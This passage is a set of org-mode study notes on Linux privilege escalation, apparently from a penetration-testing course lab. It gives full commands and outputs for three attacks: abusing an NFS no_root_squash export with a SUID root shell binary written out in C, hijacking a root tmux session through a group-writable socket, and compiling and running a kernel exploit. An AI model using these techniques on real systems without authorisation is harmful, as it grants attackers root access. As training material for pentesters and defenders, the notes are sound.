readme.org
*** Weak NFS Privileges
Network File System (NFS) allows users to access shared files or directories over the network hosted on Unix/Linux systems. NFS uses TCP/UDP port 2049. Any accessible mounts can be listed remotely by issuing the command:
#+BEGIN_SRC bash
  showmount -e 10.129.2.12

  Export list for 10.129.2.12:
  /tmp             *
  /var/nfs/general *
#+END_SRC
When an NFS volume is created, various options can be set:

| Option         | Description                                                                                                         |
|----------------+---------------------------------------------------------------------------------------------------------------------|
| root_squash    | If the root user is used to access NFS shares, it will be changed to the nfsnobody user, which is an unprivileged account. Any files created and uploaded by the root user will be owned by the nfsnobody user, which prevents an attacker from uploading binaries with the SUID bit set. |
| no_root_squash | Remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user. This would allow for the creation of malicious scripts/programs with the SUID bit set.                                                                                                                    |

#+BEGIN_SRC bash
  cat /etc/exports

  # /etc/exports: the access control list for filesystems which may be exported
  #		to NFS clients.  See exports(5).
  #
  # Example for NFSv2 and NFSv3:
  # /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
  #
  # Example for NFSv4:
  # /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
  # /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
  #
  /var/nfs/general *(rw,no_root_squash)
  /tmp *(rw,no_root_squash)

#+END_SRC
For example, we can create a SETUID binary that executes ~/bin/sh~ using our local root user. We can then mount the ~/tmp~ directory locally, copy the root-owned binary over to the NFS server, and set the SUID bit.

First, create a simple binary, mount the directory locally, copy it, and set the necessary permissions.
#+BEGIN_SRC bash
  cat shell.c 

  #include <stdio.h>
  #include <sys/types.h>
  #include <unistd.h>
  int main(void)
  {
    setuid(0); setgid(0); system("/bin/bash");
  }
#+END_SRC

#+BEGIN_SRC bash
  gcc shell.c -o shell
#+END_SRC

#+BEGIN_SRC bash
  sudo mount -t nfs 10.129.2.12:/tmp /mnt
  root@Pwnbox:~$ cp shell /mnt
  root@Pwnbox:~$ chmod u+s /mnt/shell
#+END_SRC

#+BEGIN_SRC bash
  ls -la

  total 68
  drwxrwxrwt 10 root  root   4096 Sep  1 06:15 .
  drwxr-xr-x 24 root  root   4096 Aug 31 02:24 ..
  drwxrwxrwt  2 root  root   4096 Sep  1 05:35 .font-unix
  drwxrwxrwt  2 root  root   4096 Sep  1 05:35 .ICE-unix
  -rwsr-xr-x  1 root  root  16712 Sep  1 06:15 shell
#+END_SRC

#+BEGIN_SRC bash
  ./shell
  id

  uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(user)
#+END_SRC
*** Hijacking Tmux Sessions
Terminal multiplexers such as [[https://en.wikipedia.org/wiki/Tmux][tmux]] can be used to allow multiple terminal sessions to be accessed within a single console session. When not working in a ~tmux~ window, we can detach from the session, still leaving it active (i.e., running an ~nmap~ scan). For many reasons, a user may leave a ~tmux~ process running as a privileged user, such as root set up with weak permissions, and can be hijacked. This may be done with the following commands to create a new shared session and modify the ownership.
#+BEGIN_SRC bash
  tmux -S /shareds new -s debugsess
  chown root:devs /shareds
#+END_SRC

If we can compromise a user in the ~dev~ group, we can attach to this session and gain root access.
Check for any running ~tmux~ processes.
#+BEGIN_SRC bash
  ps aux | grep tmux

  root      4806  0.0  0.1  29416  3204 ?        Ss   06:27   0:00 tmux -S /shareds new -s debugsess
#+END_SRC

Confirm permissions.
#+BEGIN_SRC bash
  ls -la /shareds 

  srw-rw---- 1 root devs 0 Sep  1 06:27 /shareds
#+END_SRC

Review our group membership.
#+BEGIN_SRC bash
  id

  uid=1000(htb) gid=1000(htb) groups=1000(htb),1011(devs)
#+END_SRC

Finally, attach to the ~tmux~ session and confirm root privileges.
#+BEGIN_SRC bash
  tmux -S /shareds

  id

  uid=0(root) gid=0(root) groups=0(root)
#+END_SRC

* Linux Internals-based Privilege Escalation
** Kernel Exploits
Kernel level exploits exist for a variety of Linux kernel versions.
It is very common to find systems that are vulnerable to kernel exploits.
Privilege escalation using a kernel exploit can be as simple as downloading, compiling, and running it.  A quick way to identify exploits is to issue the command ~uname -a~ and search Google for the kernel version.
#+BEGIN_SRC text
Note: Kernel exploits can cause system instability so use caution when running these against a production system.
#+END_SRC
~EXEMPLE~
#+BEGIN_SRC bash
  uname -a

  Linux NIX02 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
#+END_SRC

#+BEGIN_SRC bash
  cat /etc/lsb-release 

  DISTRIB_ID=Ubuntu
  DISTRIB_RELEASE=16.04
  DISTRIB_CODENAME=xenial
  DISTRIB_DESCRIPTION="Ubuntu 16.04.4 LTS"
#+END_SRC

We can see that we are on Linux Kernel 4.4.0-116 on an Ubuntu 16.04.4 LTS box. A quick Google search for ~linux 4.4.0-116-generic exploit~ comes up with [[https://vulners.com/zdt/1337DAY-ID-30003][this]] exploit PoC. Next download, it to the system using ~wget~ or another file transfer method. We can compile the exploit code using gcc and set the executable bit using ~chmod +x~.
#+BEGIN_SRC bash
  gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit
#+END_SRC

Next, we run the exploit and hopefully get dropped into a root shell.
#+BEGIN_SRC bash
  ./kernel_exploit 

  task_struct = ffff8800b71d7000
  uidptr = ffff8800b95ce544
  spawning root shell
#+END_SRC
